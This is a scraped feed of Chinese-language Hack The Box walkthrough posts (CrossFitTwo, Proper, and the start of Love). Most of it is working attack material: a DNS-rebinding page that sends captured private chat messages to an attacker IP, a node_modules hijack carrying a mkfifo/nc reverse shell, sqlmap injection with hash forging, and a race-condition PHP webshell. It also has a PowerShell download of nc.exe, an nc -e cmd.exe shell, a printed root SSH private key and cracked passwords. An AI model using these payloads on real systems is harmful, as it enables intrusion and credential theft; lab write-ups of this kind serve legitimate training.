rebind根据前面relayd配置文件，可以知道配置的是*employees.crossfit.htb, 那么我们如果在前面添加其他字符，并且控制对应dns，那么就可能劫持密码重置链接 add_forwardunbound添加一条规则，将dns请求转发到我们的dns服务器： 1unbound-control -c crossfit.conf -s 10.10.10.232 forward_add +i xemployees.crossfit.htb 10.10.14.14 dnschef1sudo python3 dnschef.py -i 10.10.14.14 --fakedomains xemployees.crossfit.htb --fakeip 10.10.14.14 直接这样得到响应，只允许localhost： 修改为127.0.0.1可以发送成功，但我们得不到请求： dns rebinding所以这里就是dns rebinding,通过dns rebinding得到重置密码链接格式： 两次dns以及请求速度要快： 1234sudo python3 dnschef.py -i 10.10.14.14 --fakedomains xemployees.crossfit.htb --fakeip 127.0.0.1sudo python3 dnschef.py -i 10.10.14.14 --fakedomains xemployees.crossfit.htb --fakeip 10.10.14.14GET &#x2F;password-reset.php?token&#x3D;xxx CSRFhttp://crossfit-club.htb是vue js，逆向调试发现Socket.IO，因为有dns rebinding，我们可以控制响应，我们可以将password-reset.php重定向到我们的包含socket.io-client.js的页面，然后响应XMLHttpRequest到nc Unbound-control添加对应forward规则， 12345unbound-control -c crossfit.conf -s 10.10.10.232 forward_add +i xemployees.crossfit.htb 10.10.14.14unbound-control -c crossfit.conf -s 10.10.10.232 forward_add +i miao.moe 10.10.14.14sudo python3 dnschef.py -i 10.10.14.14 --fakedomains xemployees.crossfit.htb --fakeip 127.0.0.1sudo python3 dnschef.py -i 10.10.14.14 --fakedomains xemployees.crossfit.htb,miao.moe --fakeip 10.10.14.14 会收到很多不同的消息，其中有一条是密码相关的： 1&#123;&quot;sender_id&quot;:2,&quot;content&quot;:&quot;Hello David, I&#39;ve added a user account for you with the password &#96;NWBFcSe3ws4VDhTB&#96;.&quot;,&quot;roomId&quot;:2,&quot;_id&quot;:1118&#125; password-reset.php1&lt;?php header(\"Location: http://miao.moe/x.html\"); ?&gt; x.html123456789101112&lt;html&gt; &lt;script src=\"http://crossfit-club.htb/socket.io/socket.io.js\"&gt;&lt;/script&gt; &lt;script&gt; var socket = io(\"http://crossfit-club.htb\"); socket.emit(\"user_join\", &#123; username : \"administrator\" &#125;); socket.on(\"private_recv\", (data) =&gt; &#123; var xhr = new XMLHttpRequest(); xhr.open(\"GET\", \"http://10.10.14.14:8000/?x=\" + JSON.stringify(data), true); xhr.send(); &#125;); &lt;/script&gt;&lt;/html&gt; user flag得到的密码就是david ssh密码，登录得到user.txt: 12ssh david@10.10.10.232NWBFcSe3ws4VDhTB 提权信息简单的枚举发现david和john都在sysadmins组，而root和john都在staff组，所以应该是要通过John： david to john默认是csh，切到/bin/sh后进行枚举： 12find / -group sysadmins -ls 2&gt;/dev/null1244170 4 drwxrwxr-x 3 root sysadmins 512 Feb 3 04:45 /opt/sysadmin 发现一个statbot.js文件： 这个脚本是john用户定时运行： 12crossfit2$ ls -al /tmp/chatbot.log-rw-r--r-- 1 john wheel 30982 May 12 06:39 /tmp/chatbot.log node_modules搜索路径劫持写log应该是用的log-to-file模块， 12find / -type d -name 'log-to-file' -ls 2&gt;/dev/null1845012 4 drwxr-xr-x 2 root wheel 512 Jan 13 10:44 /usr/local/lib/node_modules/log-to-file 根据nodejs 文档： https://nodejs.org/api/modules.html#modules_loading_from_node_modules_folders 我们可以在/opt/sysadmins写文件，如果在里面创建node_modules，优先级会比系统的module路径高 等待log执行，得到John shell： statbot.js123456789101112131415161718192021222324252627282930313233343536const WebSocket = require('ws');const fs = require('fs');const logger = require('log-to-file');const ws = new WebSocket(\"ws://gym.crossfit.htb/ws/\");function log(status, connect) &#123; var message; if(status) &#123; message = `Bot is alive`; &#125; else &#123; if(connect) &#123; message = `Bot is down (failed to connect)`; &#125; else &#123; message = `Bot is down (failed to receive)`; &#125; &#125; logger(message, '/tmp/chatbot.log');&#125;ws.on('error', function err() &#123; ws.close(); log(false, true);&#125;)ws.on('message', function message(data) &#123; data = JSON.parse(data); try &#123; if(data.status === \"200\") &#123; ws.close() log(true, false); &#125; &#125; catch(err) &#123; ws.close() log(false, false); &#125;&#125;); app.js12345678910111213141516const &#123; exec &#125; = require(\"child_process\");exec(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.14 4444 &gt;/tmp/f\", (error, stdout, stderr) =&gt; &#123; if (error) &#123; console.log(`error: $&#123;error.message&#125;`); return; &#125; if (stderr) &#123; console.log(`stderr: $&#123;stderr&#125;`); return; &#125; console.log(`stdout: $&#123;stdout&#125;`);&#125;);// Export.module.exports = logToFile; exploit.sh123456#!/bin/shmkdir -p /opt/sysadmin/node_modulescp -r /usr/local/lib/node_modules/log-to-file /opt/sysadmin/node_modules/rm /opt/sysadmin/node_modules/log-to-file/app.jswget -q -O/opt/sysadmin/node_modules/log-to-file/app.js 10.10.14.14:7777/app.js john to rootsuid log12find / -type f -group staff -ls 2&gt;/dev/null1481580 20 -rwsr-s--- 1 root staff 9024 Jan 5 13:04 /usr/local/bin/log 这个log是用于读文件的： yubikey前面看到root登录和yubikey有关： https://man.openbsd.org/man8/login_yubikey.8 所以可以读yubikey相关文件： 1234567log /var/db/yubikey/root.key &amp;&amp; log /var/db/yubikey/root.uid &amp;&amp; log /var/db/yubikey/root.ctr &amp;&amp; echo6bf9a26475388ce998988b67eaa2ea87a4ce1128bde4985089 # 转成hex是0xf0801,最后的01是计数器，用到的是0f08 根据这些，可以使用yubico生成OTP： https://github.com/Yubico/yubico-c 1ykgenerate 6bf9a26475388ce998988b67eaa2ea87 a4ce1128bde4 0f08 c0a8 00 02 ssh私钥查看change list，发现/root/.ssh/id_rsa，根据文档，存在备份： https://man.openbsd.org/changelist 默认备份路径： 1&#x2F;var&#x2F;backups&#x2F;root_.ssh_id_rsa.current 然后log去读取，得到ssh私钥： /etc/changelist123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170# $OpenBSD: changelist,v 1.127 2020&#x2F;09&#x2F;13 10:03:46 ajacoutot Exp $## List of files which the security script backs up and checks# for modifications.## Files prefixed with a &#39;+&#39; will have their checksums stored,# not the actual files.#&#x2F;etc&#x2F;Distfile&#x2F;etc&#x2F;acme-client.conf&#x2F;etc&#x2F;adduser.conf&#x2F;etc&#x2F;adduser.message&#x2F;etc&#x2F;bgpd.conf&#x2F;etc&#x2F;boot.conf&#x2F;etc&#x2F;bootparams&#x2F;etc&#x2F;changelist&#x2F;etc&#x2F;chio.conf&#x2F;etc&#x2F;crontab&#x2F;etc&#x2F;csh.cshrc&#x2F;etc&#x2F;csh.login&#x2F;etc&#x2F;csh.logout&#x2F;etc&#x2F;daily&#x2F;etc&#x2F;daily.local&#x2F;etc&#x2F;defaultdomain&#x2F;etc&#x2F;dhclient.conf&#x2F;etc&#x2F;dhcpd.conf&#x2F;etc&#x2F;disktab&#x2F;etc&#x2F;distfile&#x2F;etc&#x2F;doas.conf&#x2F;etc&#x2F;dvmrpd.conf&#x2F;etc&#x2F;eigrpd.conf&#x2F;etc&#x2F;ethers&#x2F;etc&#x2F;exports&#x2F;etc&#x2F;fbtab&#x2F;etc&#x2F;fstab&#x2F;etc&#x2F;ftpchroot&#x2F;etc&#x2F;ftpusers&#x2F;etc&#x2F;ftpwelcome&#x2F;etc&#x2F;gettytab&#x2F;etc&#x2F;group&#x2F;etc&#x2F;hostapd.conf+&#x2F;etc&#x2F;hostname.*&#x2F;etc&#x2F;hosts&#x2F;etc&#x2F;hosts.lpd&#x2F;etc&#x2F;httpd.conf&#x2F;etc&#x2F;ifstated.conf+&#x2F;etc&#x2F;iked.conf&#x2F;etc&#x2F;iked&#x2F;local.pub+&#x2F;etc&#x2F;iked&#x2F;private&#x2F;local.key&#x2F;etc&#x2F;inetd.conf&#x2F;etc&#x2F;installurl+&#x2F;etc&#x2F;ipsec.conf+&#x2F;etc&#x2F;isakmpd&#x2F;isakmpd.conf+&#x2F;etc&#x2F;isakmpd&#x2F;isakmpd.policy&#x2F;etc&#x2F;isakmpd&#x2F;local.pub+&#x2F;etc&#x2F;isakmpd&#x2F;private&#x2F;local.key&#x2F;etc&#x2F;ksh.kshrc&#x2F;etc&#x2F;ldapd.conf&#x2F;etc&#x2F;ldpd.conf&#x2F;etc&#x2F;locate.rc+&#x2F;etc&#x2F;login.conf&#x2F;etc&#x2F;login_ldap.conf&#x2F;etc&#x2F;mail.rc&#x2F;etc&#x2F;mail&#x2F;aliases&#x2F;etc&#x2F;mail&#x2F;smtpd.conf&#x2F;etc&#x2F;mail&#x2F;spamd.conf&#x2F;etc&#x2F;mailer.conf&#x2F;etc&#x2F;man.conf&#x2F;etc&#x2F;master.passwd&#x2F;etc&#x2F;mk.conf+&#x2F;etc&#x2F;moduli&#x2F;etc&#x2F;monthly&#x2F;etc&#x2F;monthly.local&#x2F;etc&#x2F;motd&#x2F;etc&#x2F;mrouted.conf&#x2F;etc&#x2F;mtree&#x2F;4.4BSD.dist&#x2F;etc&#x2F;mtree&#x2F;BSD.x11.dist&#x2F;etc&#x2F;mygate&#x2F;etc&#x2F;myname&#x2F;etc&#x2F;netgroup&#x2F;etc&#x2F;netstart&#x2F;etc&#x2F;newsyslog.conf&#x2F;etc&#x2F;npppd&#x2F;npppd.conf+&#x2F;etc&#x2F;npppd&#x2F;npppd-users&#x2F;etc&#x2F;ntpd.conf&#x2F;etc&#x2F;ospf6d.conf&#x2F;etc&#x2F;ospfd.conf&#x2F;etc&#x2F;passwd&#x2F;etc&#x2F;pf.conf&#x2F;etc&#x2F;pf.os&#x2F;etc&#x2F;printcap&#x2F;etc&#x2F;profile&#x2F;etc&#x2F;protocols+&#x2F;etc&#x2F;pwd.db&#x2F;etc&#x2F;rad.conf+&#x2F;etc&#x2F;radiusd.conf&#x2F;etc&#x2F;rbootd.conf&#x2F;etc&#x2F;rc&#x2F;etc&#x2F;rc.conf&#x2F;etc&#x2F;rc.conf.local&#x2F;etc&#x2F;rc.d&#x2F;rc.subr&#x2F;etc&#x2F;rc.local&#x2F;etc&#x2F;rc.securelevel&#x2F;etc&#x2F;rc.shutdown&#x2F;etc&#x2F;relayd.conf&#x2F;etc&#x2F;remote&#x2F;etc&#x2F;resolv.conf&#x2F;etc&#x2F;resolv.conf.tail&#x2F;etc&#x2F;ripd.conf&#x2F;etc&#x2F;rpc&#x2F;etc&#x2F;rpki&#x2F;afrinic.tal&#x2F;etc&#x2F;rpki&#x2F;apnic.tal&#x2F;etc&#x2F;rpki&#x2F;arin.tal&#x2F;etc&#x2F;rpki&#x2F;lacnic.tal&#x2F;etc&#x2F;rpki&#x2F;ripe.tal&#x2F;etc&#x2F;sasyncd.conf&#x2F;etc&#x2F;sensorsd.conf&#x2F;etc&#x2F;services&#x2F;etc&#x2F;shells+&#x2F;etc&#x2F;snmpd.conf+&#x2F;etc&#x2F;soii.key+&#x2F;etc&#x2F;spwd.db&#x2F;etc&#x2F;ssh&#x2F;ssh_config+&#x2F;etc&#x2F;ssh&#x2F;ssh_host_dsa_key&#x2F;etc&#x2F;ssh&#x2F;ssh_host_dsa_key.pub+&#x2F;etc&#x2F;ssh&#x2F;ssh_host_ecdsa_key&#x2F;etc&#x2F;ssh&#x2F;ssh_host_ecdsa_key.pub+&#x2F;etc&#x2F;ssh&#x2F;ssh_host_ed25519_key&#x2F;etc&#x2F;ssh&#x2F;ssh_host_ed25519_key.pub+&#x2F;etc&#x2F;ssh&#x2F;ssh_host_key&#x2F;etc&#x2F;ssh&#x2F;ssh_host_key.pub+&#x2F;etc&#x2F;ssh&#x2F;ssh_host_rsa_key&#x2F;etc&#x2F;ssh&#x2F;ssh_host_rsa_key.pub&#x2F;etc&#x2F;ssh&#x2F;sshd_config&#x2F;etc&#x2F;ssl&#x2F;cert.pem&#x2F;etc&#x2F;suid_profile&#x2F;etc&#x2F;sysctl.conf&#x2F;etc&#x2F;syslog.conf&#x2F;etc&#x2F;switchd.conf&#x2F;etc&#x2F;sysmerge.ignore&#x2F;etc&#x2F;ttys&#x2F;etc&#x2F;unwind.conf&#x2F;etc&#x2F;usermgmt.conf&#x2F;etc&#x2F;vm.conf&#x2F;etc&#x2F;weekly&#x2F;etc&#x2F;weekly.local&#x2F;etc&#x2F;wsconsctl.conf&#x2F;etc&#x2F;ypldap.conf&#x2F;root&#x2F;.Xdefaults&#x2F;root&#x2F;.cshrc&#x2F;root&#x2F;.login&#x2F;root&#x2F;.profile&#x2F;root&#x2F;.rhosts&#x2F;root&#x2F;.shosts&#x2F;root&#x2F;.ssh&#x2F;authorized_keys&#x2F;root&#x2F;.ssh&#x2F;authorized_keys2&#x2F;root&#x2F;.ssh&#x2F;id_rsa&#x2F;var&#x2F;cron&#x2F;at.allow&#x2F;var&#x2F;cron&#x2F;at.deny&#x2F;var&#x2F;cron&#x2F;cron.allow&#x2F;var&#x2F;cron&#x2F;cron.deny&#x2F;var&#x2F;cron&#x2F;tabs&#x2F;root&#x2F;var&#x2F;db&#x2F;unwind.key+&#x2F;var&#x2F;nsd&#x2F;etc&#x2F;nsd.conf&#x2F;var&#x2F;unbound&#x2F;etc&#x2F;unbound.conf&#x2F;var&#x2F;yp&#x2F;Makefile.main&#x2F;var&#x2F;yp&#x2F;Makefile.yp&#x2F;.cshrc&#x2F;.profile root id_rsa1234567891011121314151617181920212223242526272829303132333435363738-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEA8kTcUuEP05YI+m24YdS3WLOuYAhGt9SywnPrBTcmT3t0iZFccrHc2KmIttQRLyKOdaYiemBQmno92butoK2wkL3CAHUuPEyHVAaNsGe3UdxBCFSRZNHNLyYCMh3AWj3gYLuLniZ2l6bZOSbnifkEHjCcgy9JSGutiX+umfD11wWQyDJy2QtCHywQrKM8m1&#x2F;05+4xCqtCgveN&#x2F;FrcdrTzodAHTNoCNTgzzkKrKhcah&#x2F;nLBWp1cv30z6kPKBKx&#x2F;sZ5tHX0u169Op6JqWelCu+qZViBy&#x2F;99BDVoaRFBkolcgavhAIkV9MnUrMXRsHAucpo+nA5K4j7vwWLGTzLOzrBGA3ZDP7w2GD7KtH070CctcjXfx7fcmhPmQDBEg4chXRBDPWzGyvKr7TIEMNVtjIUg4kYNJEfSef2aWslSfi7syVUHkfvUjYnW6f2hHprHUvMtVBHPvWQxcRnxvyHuzaXetSNHROva0OpGPaqpk9IOseue7Qa1+&#x2F;PKxD4j87eCdzIpAAAFkDo2gjg6NoI4AAAAB3NzaC1yc2EAAAGBAPJE3FLhD9OWCPptuGHUt1izrmAIRrfUssJz6wU3Jk97dImRXHKx3NipiLbUES8ijnWmInpgUJp6Pdm7raCtsJC9wgB1LjxMh1QGjbBnt1HcQQhUkWTRzS8mAjIdwFo94GC7i54mdpem2Tkm54n5BB4wnIMvSUhrrYl&#x2F;rpnw9dcFkMgyctkLQh8sEKyjPJtf9OfuMQqrQoL3jfxa3Ha086HQB0zaAjU4M85CqyoXGof5ywVqdXL99M+pDygSsf7GebR19LtevTqeialnpQrvqmVYgcv&#x2F;fQQ1aGkRQZKJXIGr4QCJFfTJ1KzF0bBwLnKaPpwOSuI+78Fixk8yzs6wRgN2Qz+8Nhg+yrR9O9AnLXI138e33JoT5kAwRIOHIV0QQz1sxsryq+0yBDDVbYyFIOJGDSRH0nn9mlrJUn4u7MlVB5H71I2J1un9oR6ax1LzLVQRz71kMXEZ8b8h7s2l3rUjR0Tr2tDqRj2qqZPSDrHrnu0GtfvzysQ+I&#x2F;O3gncyKQAAAAMBAAEAAAGBAJ9RvXobW2cPcZQOd4SOeIwyjWfFyYu2ql&#x2F;KDzH81IrMaxTUrPEYGl25D5j72NkgZoLj4CSOFjOgU&#x2F;BNxZ622jg1MdFPPjqVMSGGtcLeUeXZbELoKj0c40wwOJ1wh0BRFK9IZkZ4kOCl7o&#x2F;xD67iPV0FJsf2XsDrXtHfT5kYpvLiTBX7Zx9okfEh7004g&#x2F;DBp7KmJ0YW3cR2u77KmdTOprEwtrxJWc5ZyWfI2&#x2F;rv+piVInfLTLV0YHv3d2oo8TjUl4kSe2FSzhzFPvNh6RVWvvtZ96lEK3OvMpiC+QKRA2azc8QMqYHyLF7Y65y6a9YwH+Z6GOtB+PjezsbjO&#x2F;k+GbkvjClXT6FWYzIuV+DuT153D&#x2F;HXxJKjxybhiJHdkEyyQPvNH8wEyXXSsVPl&#x2F;qZ+4OJ0mrrUif81SwxiHWP0CR7YCje9CzmsHzizadhvOZgtXsUUlooZSGboFRSdxElER3ztydWt2sLPDZVuFUAp6ZeMtmgo3q7HCpUsHNGtuWSO6QAAAMEA6INodzwbSJ+6kitWyKhOVpX8XDbTd2PQjOnq6BS&#x2F;vFI+fFhAbMH&#x2F;6MVZdMrB6d7cRHBwaBNcoH0pdem0K&#x2F;Ti+f6fU5uu5OGOb+dcE2dCdJwMe5U&#x2F;nt74guVOgHTGvKmVQpGhneZmy2ppHWty+6QimFeeSoV6y58Je31QUU1d4Y1m+Uh&#x2F;Q5ERC9Zs1jsMmuqcNnva2&#x2F;jJ487vhmchwoJ9VPaSxM5y7PJaA9NwwhML+1DwxJT799fTcfOpXYRAAKiiAAAAwQD5vSp5ztEPVvt1cvxqg7LX7uLOX&#x2F;1NL3aGEmZGevoOp3D1ZXbMorDljV2e73UxDJbhCdv7pbYSMwcwL4RnhpaTdLtEoTLMFJN&#x2F;rHhyBdQ2j54uztoTVguYb1tC&#x2F;uQZvptX&#x2F;1DJRtqLVYe6hT6vIJuk&#x2F;fi8tktL&#x2F;yvaCuG0vLdOO52RjK5Ysqu64G2w+bXnD5t1LrWJRBK2PmJf+406c6USo4rIdrwvSWjYrMCCMoAzo75PnKiz5fw0ltXCGy5Y6PMAAADBAPhXwJlRY9yRLUhxg4GkVdGfEA5pDI1SJxxCXG8yYYAmxI9iODO2xBFR1of1BkgfhyoF6&#x2F;no8zIj1UdqlM3RDjUuWJYwWvSZGXewr+OTehyqAgK88eFS44OHFUJBBLB33Q71hhvf8CjTMHN3T+x1jEzMvEtw8s0bCXRSj378fxhq&#x2F;K8k9yVXUuG8ivLI3ZTDD46thrjxnn9D47DqDLXxCR837fsifgjv5kQTGaHl0+MRa5GlRKfg&#x2F;OEuYUYu9LJ&#x2F;cwAAABJyb290QGNyb3NzZml0Mi5odGIBAgMEBQYH-----END OPENSSH PRIVATE KEY----- root flag生成Yubikey密码，使用公钥及密码登录，得到root.txt: 12➜ yubico-c git:(master) ✗ ./ykgenerate 6bf9a26475388ce998988b67eaa2ea87 a4ce1128bde4 0f08 c0a8 00 02cttndvdheldlhjfubluidkckfvgjvbeb 参考资料 https://amphp.org/websocket-client/ https://man.openbsd.org/unbound.conf https://github.com/iphelix/dnschef https://nodejs.org/api/modules.html#modules_loading_from_node_modules_folders https://man.openbsd.org/man8/login_yubikey.8 https://github.com/Yubico/yubico-c https://man.openbsd.org/changelist https://man.openbsd.org/?query=config&amp;apropos=1&amp;sec=5&amp;arch=default&amp;manpath=OpenBSD-current Crossfittwo | RaidForumshttps://raidforums.com/Thread-Free-Flag-Crossfittwo CrossFitTwo: Hack The Box Walkthroughhttps://hackso.me/crossfit2-htb-walkthrough/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Proper - HackTheBox","slug":"Proper-HackTheBox","date":"2021-05-10T08:47:38.000Z","updated":"2021-08-23T01:21:44.231Z","comments":true,"path":"2021/05/10/Proper-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/05/10/Proper-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/321 10.10.10.231 端口扫描只有一个80: 1234567891011121314151617$ nmap -sC -sV -Pn 10.10.10.231Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-10 14:23 CSTNmap scan report for 10.10.10.231Host is up (0.069s latency).Not shown: 999 filtered portsPORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 10.0| http-methods:|_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: OS Tidy Inc.Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 62.70 seconds 80 目录扫描目录扫描发现licenses： 1234567gobuster dir -u http://10.10.10.231/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x asp,html,txt -t 50/Index.html (Status: 200) [Size: 14257]/assets (Status: 301) [Size: 150] [--&gt; http://10.10.10.231/assets/]/index.html (Status: 200) [Size: 14257]/index.html (Status: 200) [Size: 14257]/licenses (Status: 301) [Size: 152] [--&gt; http://10.10.10.231/licenses/] licenses需要登录： 信息页面源码给出一些信息，大概是用户名： 一个接口，如果缺少参数，报错注释里得到salt： 123http:&#x2F;&#x2F;10.10.10.231&#x2F;products-ajax.php?order&#x3D;id+desc&amp;h&#x3D;a1b30d31d344a5a4e41e8496ccbdd26bdefine(&#39;SECURE_PARAM_SALT&#39;,&#39;hie0shah6ooNoim&#39;); 加密算法h大概是对order参数的加密签名之类的，现在有明文参数，salt，不知道加密方式，需要进一步分析： 1234567891011121314151617# order参数不同格式作为wordlistid+descid%20descid desc# john的各种格式john --list&#x3D;subformats | grep md5...Format &#x3D; dynamic_1 type &#x3D; dynamic_1: md5($p.$s) (joomla)...Format &#x3D; dynamic_4 type &#x3D; dynamic_4: md5($s.$p) (OSC)...# 根据格式知道带salt的hash格式&lt;hash&gt;$&lt;salt&gt;# hasha1b30d31d344a5a4e41e8496ccbdd26b$hie0shah6ooNoim 简单的分析，知道加密方式和参数格式： sqlmap之后就可以自定义sql，sqlmap eval可以处理参数： 1234567891011121314sqlmap -u &quot;http:&#x2F;&#x2F;10.10.10.231&#x2F;products-ajax.php?order&#x3D;id+desc&amp;h&#x3D;a1b30d31d344a5a4e41e8496ccbdd26b&quot; --eval&#x3D;&quot;import hashlib ; h&#x3D;hashlib.md5((&#39;hie0shah6ooNoim&#39;+order).encode(&#39;utf-8&#39;)).hexdigest()&quot; --batch --threads&#x3D;10available databases [3]:[*] cleaner[*] information_schema[*] testsqlmap -u &quot;http:&#x2F;&#x2F;10.10.10.231&#x2F;products-ajax.php?order&#x3D;id+desc&amp;h&#x3D;a1b30d31d344a5a4e41e8496ccbdd26b&quot; --eval&#x3D;&quot;import hashlib ; h&#x3D;hashlib.md5((&#39;hie0shah6ooNoim&#39;+order).encode(&#39;utf-8&#39;)).hexdigest()&quot; --batch --threads&#x3D;10 -D cleaner -T licenses -C customer_id,id,license,product_id --dumpsqlmap -u &quot;http:&#x2F;&#x2F;10.10.10.231&#x2F;products-ajax.php?order&#x3D;id+desc&amp;h&#x3D;a1b30d31d344a5a4e41e8496ccbdd26b&quot; --eval&#x3D;&quot;import hashlib ; h&#x3D;hashlib.md5((&#39;hie0shah6ooNoim&#39;+order).encode(&#39;utf-8&#39;)).hexdigest()&quot; --batch --threads&#x3D;10 -D cleaner -T customers -C id,login,password --dumpvikki.solomon@throwaway.mail7c6a180b36896a0a8c02787eeafb0e4cpassword1 Licensing Portal得到的任意一个账号密码登录portal： 源码里又发现类似格式的接口： LFI这里theme应该是include的，所以可以修改为..，h参数也对应修改，得到报错： 123theme &#x3D; &quot;..&quot;import hashlib ; h&#x3D;hashlib.md5((&#39;hie0shah6ooNoim&#39;+theme).encode(&#39;utf-8&#39;)).hexdigest()c5427f8e0865273f4a62c614adec0985 RFI123theme &#x3D; &quot;http:&#x2F;&#x2F;10.10.14.3:7777&quot;import hashlib ; h&#x3D;hashlib.md5((&#39;hie0shah6ooNoim&#39;+theme).encode(&#39;utf-8&#39;)).hexdigest()6689491e9ca82644f7d54bec3a39f4ba SMBsmbserver开启smb2support,可以得到NetNTLMv2 hash: 12345theme &#x3D; &quot;&#x2F;&#x2F;10.10.14.3&#x2F;miao&quot;import hashlib ; h&#x3D;hashlib.md5((&#39;hie0shah6ooNoim&#39;+theme).encode(&#39;utf-8&#39;)).hexdigest()411d5bd4bc64f686ca745ac4e2587125sudo python3 ~&#x2F;Tools&#x2F;impacket&#x2F;examples&#x2F;smbserver.py -smb2support miao . hash crack破解出来web用户密码： 12345678910➜ Desktop sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt[sudo] password for miao:Using default input encoding: UTF-8Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])Will run 2 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statuscharlotte123! (web)1g 0:00:00:00 DONE (2021-05-07 08:20) 1.098g/s 1089Kp/s 1089Kc/s 1089KC/s cheers4$..chaquetoUse the \"--show --format=netntlmv2\" options to display all of the cracked passwords reliablySession completed 条件竞争webshell可以使用得到的用户名密码模拟真正的smb共享，但如果直接header.inc文件写shell的话，会因为strpos检测得到403，但可以条件竞争，通过strpos校验后写入webshell，使其include： 123sudo python3 ~&#x2F;Tools&#x2F;impacket&#x2F;examples&#x2F;smbserver.py -username web -password &#39;charlotte123!&#39; -ip 10.10.14.3 -smb2support miao ..&#x2F;race.sh &quot;&lt;?php phpinfo(); ?&gt;&quot; reverse shell下载nc反弹shell： 12./race.sh '&lt;?php system(\"cmd /c powershell iwr http://10.10.14.3:7777/nc.exe -outf \\windows\\system32\\spool\\drivers\\color\\cute.exe\"); ?&gt;'./race.sh '&lt;?php system(\"cmd /c start \\windows\\system32\\spool\\drivers\\color\\cute.exe 10.10.14.3 4444 -e cmd.exe\"); ?&gt;' race.sh123456#!/bin/bashPAYLOAD=$1while :; do echo hello world &gt; /Users/miao/Downloads/temp/header.inc echo \"$PAYLOAD\" &gt; /Users/miao/Downloads/temp/header.incdone user flagweb用户桌面目录得到user.txt: 提权信息发现一个Cleanup，两个exe下载下来分析： 分析后可以知道server会监听cleanupPipe，接收clean指令，将输入的文件名base64，文件内容AES-GCM后存放到Cleanup目录 RESTORE是将文件解密还原到原本位置 那么我们可以考虑做一个到C:\\Users \\Administrator\\Desktop的符号链接，clean的时候指向root.txt,RESTORE的时候删掉软链接，创建同名目录，那么就会还原到这个目录里 root flag 整个流程大概就这样,得到root.txt： 123456789mklink /j miao \\users\\administrator\\desktopecho CLEAN \\users\\web\\downloads\\miao\\root.txtx &gt; \\\\.\\pipe\\cleanupPipedir \\programdata\\cleanuprmdir miaomkdir miaoecho RESTORE \\users\\web\\downloads\\miao\\root.txtx &gt; \\\\.\\pipe\\cleanupPipe 参考资料 https://github.com/sailay1996/WerTrigger Proper Writeup [NO CREDITS NEEDED] | RaidForumshttps://raidforums.com/Thread-Free-Flag-Proper-Writeup-NO-CREDITS-NEEDED","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Love - HackTheBox","slug":"Love-HackTheBox","date":"2021-05-06T06:25:53.000Z","updated":"2021-08-09T01:09:36.675Z","comments":true,"path":"2021/05/06/Love-HackTheBox/","link":"","permalink":"https://darkwing.moe/2021/05/06/Love-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/344 10.10.10.239 端口扫描后面做HTB也直接用autoreccon了 一些常见端口： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124$ cat scans/_quick_tcp_nmap.txt# Nmap 7.91 scan initiated Thu May 6 05:14:21 2021 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /results/10.10.10.239/scans/_quick_tcp_nmap.txt -oX /results/10.10.10.239/scans/xml/_quick_tcp_nmap.xml 10.10.10.239Nmap scan report for 10.10.10.239Host is up, received user-set (0.88s latency).Scanned at 2021-05-06 05:14:22 UTC for 29sNot shown: 993 closed portsReason: 993 resetsPORT STATE SERVICE REASON VERSION80/tcp open http syn-ack ttl 37 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)| http-cookie-flags:| /:| PHPSESSID:|_ httponly flag not set| http-methods:|_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27|_http-title: Voting System using PHP135/tcp open msrpc syn-ack ttl 37 Microsoft Windows RPC139/tcp open netbios-ssn syn-ack ttl 37 Microsoft Windows netbios-ssn443/tcp open ssl/http syn-ack ttl 37 Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27|_http-title: 403 Forbidden| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in/localityName=norway/emailAddress=roy@love.htb/organizationalUnitName=love.htb| Issuer: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in/localityName=norway/emailAddress=roy@love.htb/organizationalUnitName=love.htb| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2021-01-18T14:00:16| Not valid after: 2022-01-18T14:00:16| MD5: bff0 1add 5048 afc8 b3cf 7140 6e68 5ff6| SHA-1: 83ed 29c4 70f6 4036 a6f4 2d4d 4cf6 18a2 e9e4 96c2| -----BEGIN CERTIFICATE-----| MIIDozCCAosCFFhDHcnclWJmeuqOK/LQv3XDNEu4MA0GCSqGSIb3DQEBCwUAMIGN| 